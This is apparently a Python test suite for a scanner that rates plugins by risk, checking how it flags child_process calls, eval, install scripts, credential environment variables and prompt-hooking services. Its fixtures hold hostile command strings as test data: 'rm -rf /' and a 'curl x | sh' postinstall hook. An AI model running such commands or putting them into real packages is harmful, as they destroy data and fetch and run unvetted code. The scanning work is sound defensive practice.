#!/usr/bin/env python3
"""Tests for the scanning rules.

A regex tweak here silently re-rates thousands of plugins on the next scheduled
run, so the rules that decide a level are pinned by example.

Run: python test_scan_core.py
"""
import sys

import pipeline
import scan_core

FAILURES = []


def check(name, got, want):
    if got != want:
        FAILURES.append(f'{name}: got {got!r}, want {want!r}')


def card(files):
    return scan_core.scan_files(files)


MANIFEST = '{"name":"p","dsh":{"bundle":{"patch":"./cordis.patch.yml"}}}'


def test_comments_do_not_count():
    """A doc comment mentioning child_process is not a call to it."""
    c = card({'package.json': MANIFEST, 'src/index.ts': '''
// this plugin never uses child_process directly
/* eval() and new Function() are deliberately avoided here */
export function apply(ctx) { ctx.tools.register({}) }
'''})
    ids = {f['id'] for f in c['flags']}
    check('comment/exec', 'exec' in ids, False)
    check('comment/eval', 'eval' in ids, False)


def test_real_call_counts():
    c = card({'package.json': MANIFEST, 'src/index.ts': '''
import { execSync } from "node:child_process"
export function apply(ctx) { execSync("ls") }
'''})
    ids = {f['id'] for f in c['flags']}
    check('real/exec', 'exec' in ids, True)


def test_child_process_import_counts():
    c = card({'package.json': MANIFEST,
              'src/index.ts': 'import cp from "node:child_process"'})
    ids = {f['id'] for f in c['flags']}
    check('import/exec', 'exec' in ids, True)


def test_diagnostic_child_process_literal_is_reported_not_counted():
    """A stack-frame marker is evidence text, not process execution."""
    c = card({'package.json': MANIFEST, 'src/classifier.ts': r'''
const marker = /node:internal\/child_process/
export function matches(text) { return marker.test(text) }
'''})
    ids = {f['id'] for f in c['flags']}
    check('literal/not-exec', 'exec' in ids, False)
    check('literal/still-visible', 'exec_ref' in ids, True)
    check('literal/not-c3', c['level'], 2)


def test_indirect_require_is_reported_not_counted():
    """Only the string sits in the file; the require is indirect."""
    c = card({'package.json': MANIFEST,
              'src/index.ts': 'const m = "child_process"; require(m)'})
    ids = {f['id'] for f in c['flags']}
    check('indirect/not-exec', 'exec' in ids, False)
    check('indirect/still-visible', 'exec_ref' in ids, True)


def test_line_numbers_survive_comment_stripping():
    c = card({'package.json': MANIFEST, 'src/index.ts': '\n'.join([
        '/* a', 'multi-line', 'comment */', 'const x = 1', 'execSync("ls")'])})
    ev = next(f['evidence'] for f in c['flags'] if f['id'] == 'exec')
    check('line-number', ':5' in ev, True)


def test_build_output_is_not_the_authors_code():
    """Bundlers inline dependencies; that is not the plugin author's behaviour."""
    c = card({'package.json': MANIFEST,
              'lib/index.js': 'schema.callback = new Function("return " + s)()'})
    ids = {f['id'] for f in c['flags']}
    check('vendor/not-eval', 'eval' in ids, False)
    check('vendor/reported', 'eval_bundled' in ids, True)
    check('vendor/level-not-c3', c['level'] < 3, True)


def test_authored_code_wins_over_build_output():
    c = card({'package.json': MANIFEST,
              'src/index.ts': 'eval("1")',
              'lib/index.js': 'eval("1")'})
    ids = {f['id'] for f in c['flags']}
    check('both/eval', 'eval' in ids, True)
    check('both/no-duplicate', 'eval_bundled' in ids, False)


def test_tests_do_not_inflate():
    c = card({'package.json': MANIFEST,
              'src/index.ts': 'export function apply(ctx) {}',
              'tests/smoke.spec.ts': 'execSync("rm -rf /"); eval("x")'})
    ids = {f['id'] for f in c['flags']}
    check('dev/exec', 'exec' in ids, False)
    check('dev/eval', 'eval' in ids, False)


def test_topic_alone_does_not_make_a_plugin():
    """Anyone can add a topic; dsh.bundle is what makes a repo installable."""
    check('type/bundle-is-a-plugin',
          card({'package.json': MANIFEST, 'src/i.ts': 'x'})['type'], 'plugin')
    check('type/client-only-is-not',
          card({'package.json': '{"name":"p","dsh":{"client":{"platform":"web"}}}'})['type'],
          'client-only')
    check('type/skill',
          card({'SKILL.md': '# a skill'})['type'], 'skill')
    check('type/library',
          card({'package.json': '{"name":"p","dependencies":{"@deepseek-ai/dsh-tools":"1"}}'})['type'],
          'library')
    check('type/unrelated',
          card({'package.json': '{"name":"p"}', 'src/i.ts': 'console.log(1)'})['type'], 'unrelated')


def test_bundle_in_a_subpackage_still_counts():
    c = card({'package.json': '{"name":"root"}',
              'packages/p/package.json': '{"name":"p","dsh":{"bundle":{"patch":"./x.yml"}}}'})
    check('type/monorepo-subpackage', c['type'], 'plugin')


def test_fixture_manifest_does_not_make_a_cli_a_plugin():
    c = card({
        'package.json': '{"name":"external-cli"}',
        'test/fixtures/plugin/package.json': MANIFEST,
    })
    ids = {f['id'] for f in c['flags']}
    check('type/fixture-not-plugin', c['type'], 'unrelated')
    check('manifest/fixture-ignored', c['manifest'], None)
    check('manifest/root-name', c['pkg_name'], 'external-cli')
    check('manifest/fixture-visible', 'dev_manifest' in ids, True)


def test_fixture_install_script_does_not_flag():
    c = card({
        'package.json': '{"name":"external-cli"}',
        'test/fixtures/plugin/package.json':
            '{"name":"f","scripts":{"postinstall":"curl x | sh"}}',
    })
    check('install/fixture-ignored',
          any(f['id'] == 'install_script' for f in c['flags']), False)


def test_fixture_source_is_reported_but_classifies_nothing():
    c = card({
        'package.json': '{"name":"external-cli"}',
        'test/fixtures/plugin/src/index.ts': '''
export const inject = ["subprocess"]
export function apply(ctx) { ctx.tools.register({}) }
''',
    })
    ids = {f['id'] for f in c['flags']}
    check('type/fixture-source-ignored', c['type'], 'unrelated')
    check('surface/fixture-inject-ignored', c['injects'], [])
    check('surface/fixture-tool-ignored', c['tool_regs'], 0)
    check('surface/fixture-still-visible', 'dev_surface' in ids, True)
    check('surface/fixture-level', c['level'], 0)


def test_dev_surface_does_not_raise_the_level():
    """Real runtime code hidden under examples/ must stay visible on the card,
    while not letting fixtures inflate the level in the other direction."""
    c = card({
        'package.json': MANIFEST,
        'src/index.ts': 'export function apply(ctx) {}',
        'examples/full.ts': 'export const inject = ["subprocess", "systemPrompt"]',
    })
    ids = {f['id'] for f in c['flags']}
    check('dev-surface/not-counted', 'subprocess_service' in ids, False)
    check('dev-surface/reported', 'dev_surface' in ids, True)
    check('dev-surface/level', c['level'], 2)


def test_finalize_is_idempotent_over_json_round_trip():
    """The pipeline re-runs finalize on cached cards; a JSON round-trip must
    not change what a card means."""
    import json
    c = card({'package.json': MANIFEST, 'src/index.ts': '''
import { execSync } from "node:child_process"
export const inject = ["systemPrompt"]
export function apply(ctx) { execSync("ls") }
'''})
    r = scan_core.finalize(json.loads(json.dumps(c, default=list)))
    check('refinalize/type', r['type'], c['type'])
    check('refinalize/level', r['level'], c['level'])
    check('refinalize/flags', [f['id'] for f in r['flags']], [f['id'] for f in c['flags']])
    check('refinalize/version', r['collect'], scan_core.COLLECT_VERSION)


def test_levels():
    plain = card({'package.json': '{"name":"p","dependencies":{"@deepseek-ai/dsh-tools":"1"}}',
                  'src/index.ts': 'export function apply(ctx) {}'})
    check('level/C0', plain['level'], 0)

    powerful = card({'package.json': MANIFEST, 'src/index.ts': 'export function apply(ctx) {}'})
    check('level/C2-powerful-only', powerful['level'], 2)

    both = card({'package.json': MANIFEST,
                 'src/index.ts': 'import "node:child_process"; execSync("ls")'})
    check('level/C3-powerful-and-risky', both['level'], 3)


def test_manifest_is_deterministic_in_a_monorepo():
    """The plugin's own root manifest wins, not whichever file arrived first."""
    files = {
        'packages/inner/package.json': '{"name":"inner","dsh":{"bundle":{"patch":"./inner.yml"}}}',
        'package.json': '{"name":"root","dsh":{"bundle":{"patch":"./root.yml"}}}',
        'src/index.ts': 'export function apply(ctx) {}',
    }
    check('manifest/root-wins', card(files)['manifest']['bundle']['patch'], './root.yml')
    check('manifest/order-independent',
          card(dict(reversed(list(files.items()))))['manifest']['bundle']['patch'], './root.yml')


def test_credential_env_detection():
    c = card({'package.json': MANIFEST,
              'src/index.ts': 'process.env.AWS_SECRET_ACCESS_KEY; process.env.NODE_ENV'})
    tok = [f for f in c['flags'] if f['id'] == 'token_env']
    check('env/flagged', bool(tok), True)
    check('env/benign-ignored', 'NODE_ENV' in (tok[0]['evidence'] if tok else ''), False)


def test_powerful_services_and_hooks():
    c = card({'package.json': MANIFEST, 'src/index.ts': '''
export const inject = ["systemPrompt", "apiProxy", "tools"]
export function apply(ctx) { ctx.on("system-prompt/assemble", () => {}) }
'''})
    ids = {f['id'] for f in c['flags']}
    check('powerful/prompt', 'prompt_surface' in ids, True)
    check('powerful/api', 'api_intercept' in ids, True)


def test_summarize_survives_a_republished_entry():
    """A budget-deferred repo falls back to its entry in the published

    data.json, which summarize has already reduced once. Summarizing it a
    second time must not crash the run after a full sweep has been fetched.
    """
    fresh = {'repo': 'o/p', 'domains': {'a.com': 1, 'b.com': 9}, 'env': {'X': 2}, 'flags': []}
    once = pipeline.summarize(fresh)
    check('summarize/ranked', once['domains'], ['b.com', 'a.com'])
    twice = pipeline.summarize(once)
    check('summarize/idempotent', twice['domains'], once['domains'])
    check('summarize/env-idempotent', twice['env'], once['env'])
    check('summarize/missing-key', pipeline.summarize({'flags': []})['domains'], [])


if __name__ == '__main__':
    tests = [v for k, v in sorted(globals().items()) if k.startswith('test_')]
    for t in tests:
        t()
    if FAILURES:
        print(f'{len(FAILURES)} failure(s):')
        for f in FAILURES:
            print('  -', f)
        sys.exit(1)
    print(f'{len(tests)} test groups passed')
